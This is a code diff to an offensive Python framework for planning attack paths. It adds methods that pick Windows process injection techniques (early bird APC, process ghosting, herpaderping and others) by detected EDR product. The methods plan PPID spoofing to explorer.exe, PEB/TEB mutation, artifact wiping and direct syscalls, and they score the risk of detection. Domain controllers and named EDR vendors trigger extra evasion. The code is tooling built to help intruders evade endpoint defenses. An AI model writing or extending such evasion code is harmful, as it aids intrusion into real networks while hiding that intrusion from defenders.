@@ -5,6 +5,7 @@ Analyzes network topology, credentials, and defenses to optimize attack paths
 Includes evasion profile scoring for detection risk assessment
 Integrates with bypass_amsi_etw for defense analysis
 Integrates with sleepmask_cloaking for memory cloaking guidance
+Integrates with process_injection_masterclass for AI-dynamic injection
 """
 
 import json
@@ -52,6 +53,25 @@ except ImportError:
     HAS_SLEEPMASK_CLOAKING = False
     SleepmaskCloakingEngine = None
     CloakLevel = None
+
+# NEW: Process Injection Masterclass entegrasyonu
+try:
+    from evasion.process_injection_masterclass import (
+        ProcessInjectionMasterclass,
+        AIInjectionSelector,
+        EDRDetector,
+        InjectionTechnique,
+        EDRProduct as InjectionEDRProduct,
+        InjectionConfig,
+        EDR_INJECTION_PROFILES,
+        create_masterclass_injector,
+        get_ai_recommendation as get_injection_recommendation
+    )
+    HAS_INJECTION_MASTERCLASS = True
+except ImportError:
+    HAS_INJECTION_MASTERCLASS = False
+    ProcessInjectionMasterclass = None
+    InjectionTechnique = None
 
 # Try to import LLM engine
 try:
@@ -1677,7 +1697,7 @@ Return as JSON array.
         self,
         target: str = None,
         auto_detect: bool = True
-    ) -> Optional['SleepmaskCloakingEngine']:
+    ):
         """
         Create a SleepmaskCloakingEngine with AI-recommended settings.
         
@@ -1722,3 +1742,231 @@ Return as JSON array.
         except Exception as e:
             self._log(f"Failed to create cloaking engine: {e}")
             return None
+    
+    # ============================================================
+    # PROCESS INJECTION MASTERCLASS INTEGRATION
+    # ============================================================
+    
+    def get_injection_recommendation(self, target: str = None) -> Dict[str, Any]:
+        """
+        Get AI-guided injection technique recommendation.
+        
+        Analyzes target defenses and recommends optimal injection chain.
+        
+        Args:
+            target: Target hostname (optional, for context)
+        
+        Returns:
+            Dict with:
+            - detected_edr: Primary EDR detected
+            - primary_technique: Recommended injection technique
+            - fallback_chain: Ordered list of fallback techniques
+            - ppid_spoof_required: Whether PPID spoofing is needed
+            - mutation_required: Whether PEB/TEB mutation is needed
+            - artifact_wipe: Whether artifact wiping is needed
+            - delay_ms: Recommended delay before injection
+            - recommendation: Human-readable recommendation
+        """
+        result = {
+            'detected_edr': 'None',
+            'primary_technique': 'early_bird_apc',
+            'fallback_chain': ['module_stomping', 'thread_hijack', 'classic_crt'],
+            'ppid_spoof_required': True,
+            'mutation_required': False,
+            'artifact_wipe': True,
+            'delay_ms': 1500,
+            'use_syscalls': True,
+            'recommendation': 'Default injection chain',
+            'techniques_by_stealth': [],
+            'error': None,
+        }
+        
+        if not HAS_INJECTION_MASTERCLASS:
+            result['error'] = 'Injection masterclass module not available'
+            result['recommendation'] = 'Install process_injection_masterclass module'
+            return result
+        
+        try:
+            # Use AI selector
+            selector = AIInjectionSelector()
+            technique, profile_info = selector.detect_and_select()
+            
+            profile = profile_info.get('profile', {})
+            edr = profile_info.get('edr', InjectionEDRProduct.NONE)
+            
+            result['detected_edr'] = profile.get('name', 'None')
+            result['primary_technique'] = technique.value
+            result['fallback_chain'] = [t.value for t in profile.get('fallback_chain', [])]
+            result['ppid_spoof_required'] = profile.get('ppid_spoof_required', True)
+            result['mutation_required'] = profile.get('mutation_required', False)
+            result['artifact_wipe'] = profile.get('artifact_wipe', True)
+            result['delay_ms'] = profile.get('delay_injection_ms', 1500)
+            result['use_syscalls'] = profile.get('use_syscalls', True)
+            result['recommendation'] = selector.get_recommendation()
+            
+            # Add target-specific adjustments
+            if target and target in self.hosts:
+                host = self.hosts[target]
+                if host.is_dc:
+                    result['ppid_spoof_required'] = True
+                    result['mutation_required'] = True
+                    result['artifact_wipe'] = True
+                    result['delay_ms'] = max(result['delay_ms'], 3000)
+                if host.av_product:
+                    av_lower = host.av_product.lower()
+                    if 'crowdstrike' in av_lower or 'sentinelone' in av_lower:
+                        result['mutation_required'] = True
+            
+            self._log(f"Injection recommendation: {result['primary_technique']} for {result['detected_edr']}")
+            
+        except Exception as e:
+            result['error'] = str(e)
+            result['recommendation'] = f'Error: {e}'
+        
+        return result
+    
+    def create_injection_engine(
+        self,
+        target: str = None,
+        ai_adaptive: bool = True,
+        enable_ppid_spoof: bool = True,
+        enable_mutation: bool = True,
+        enable_artifact_wipe: bool = True
+    ):
+        """
+        Create a ProcessInjectionMasterclass with AI-recommended settings.
+        
+        Args:
+            target: Target host for context
+            ai_adaptive: Use AI-adaptive technique selection
+            enable_ppid_spoof: Enable PPID spoofing
+            enable_mutation: Enable PEB/TEB mutation
+            enable_artifact_wipe: Enable artifact wiping
+        
+        Returns:
+            Configured ProcessInjectionMasterclass instance or None
+        """
+        if not HAS_INJECTION_MASTERCLASS:
+            self._log("Injection masterclass not available")
+            return None
+        
+        try:
+            # Get recommendation for target-specific settings
+            rec = self.get_injection_recommendation(target)
+            
+            # Override with recommendation if not explicitly set
+            if rec.get('ppid_spoof_required'):
+                enable_ppid_spoof = True
+            if rec.get('mutation_required'):
+                enable_mutation = True
+            if rec.get('artifact_wipe'):
+                enable_artifact_wipe = True
+            
+            # Create engine
+            config = InjectionConfig(
+                ai_adaptive=ai_adaptive,
+                auto_detect_edr=ai_adaptive,
+                enable_ppid_spoof=enable_ppid_spoof,
+                enable_mutation=enable_mutation,
+                enable_artifact_wipe=enable_artifact_wipe,
+                delay_execution_ms=rec.get('delay_ms', 1500),
+                use_syscalls=rec.get('use_syscalls', True),
+            )
+            
+            engine = ProcessInjectionMasterclass(config)
+            
+            self._log(f"Created injection engine: ai_adaptive={ai_adaptive}, ppid_spoof={enable_ppid_spoof}")
+            return engine
+            
+        except Exception as e:
+            self._log(f"Failed to create injection engine: {e}")
+            return None
+    
+    def recommend_injection_for_target(
+        self,
+        target: str,
+        shellcode_size: int = 0,
+        requires_pe: bool = False
+    ) -> Dict[str, Any]:
+        """
+        Get target-specific injection recommendation.
+        
+        Considers host intel, EDR, and payload requirements.
+        
+        Args:
+            target: Target hostname
+            shellcode_size: Size of shellcode (affects technique selection)
+            requires_pe: Whether payload requires PE execution
+        
+        Returns:
+            Dict with technique recommendation and execution plan
+        """
+        result = {
+            'target': target,
+            'recommended_technique': 'early_bird_apc',
+            'execution_plan': [],
+            'opsec_requirements': [],
+            'estimated_detection_risk': 0.5,
+            'estimated_behavioral_score': 0.5,
+            'notes': [],
+        }
+        
+        # Get base recommendation
+        base_rec = self.get_injection_recommendation(target)
+        result['recommended_technique'] = base_rec['primary_technique']
+        
+        # Build execution plan
+        execution_plan = [
+            {'step': 1, 'action': 'Detect EDR', 'detail': f"Detected: {base_rec['detected_edr']}"},
+            {'step': 2, 'action': 'PPID Spoof', 'detail': 'Spoof to explorer.exe' if base_rec['ppid_spoof_required'] else 'Skip'},
+            {'step': 3, 'action': 'Delay', 'detail': f"Wait {base_rec['delay_ms']}ms"},
+            {'step': 4, 'action': 'Inject', 'detail': f"Primary: {base_rec['primary_technique']}"},
+            {'step': 5, 'action': 'Mutation', 'detail': 'Apply PEB/TEB mutation' if base_rec['mutation_required'] else 'Skip'},
+            {'step': 6, 'action': 'Artifact Wipe', 'detail': 'Wipe process artifacts' if base_rec['artifact_wipe'] else 'Skip'},
+        ]
+        result['execution_plan'] = execution_plan
+        
+        # OPSEC requirements
+        if base_rec['ppid_spoof_required']:
+            result['opsec_requirements'].append('PPID spoofing required for process tree evasion')
+        if base_rec['mutation_required']:
+            result['opsec_requirements'].append('PEB/TEB mutation required for anti-forensics')
+        if base_rec['use_syscalls']:
+            result['opsec_requirements'].append('Direct syscalls for user-mode hook bypass')
+        
+        # Adjust for PE requirement
+        if requires_pe:
+            pe_techniques = ['ghosting', 'herpaderping', 'doppelganging', 'hollowing']
+            if result['recommended_technique'] not in pe_techniques:
+                result['recommended_technique'] = 'ghosting'
+                result['notes'].append('Switched to ghosting for PE payload requirement')
+        
+        # Estimate detection risk
+        technique_risk = {
+            'ghosting': 0.05,
+            'herpaderping': 0.05,
+            'transacted_hollowing': 0.10,
+            'doppelganging': 0.10,
+            'syscall': 0.10,
+            'module_stomping': 0.15,
+            'early_bird_apc': 0.20,
+            'phantom_dll': 0.20,
+            'thread_hijack': 0.30,
+            'hollowing': 0.35,
+            'classic_crt': 0.80,
+        }
+        
+        base_risk = technique_risk.get(result['recommended_technique'], 0.5)
+        
+        # Adjust for OPSEC measures
+        if base_rec['ppid_spoof_required']:
+            base_risk *= 0.8
+        if base_rec['mutation_required']:
+            base_risk *= 0.9
+        if base_rec['artifact_wipe']:
+            base_risk *= 0.9
+        
+        result['estimated_detection_risk'] = round(base_risk, 2)
+        result['estimated_behavioral_score'] = round(base_risk, 2)
+        
+        return result
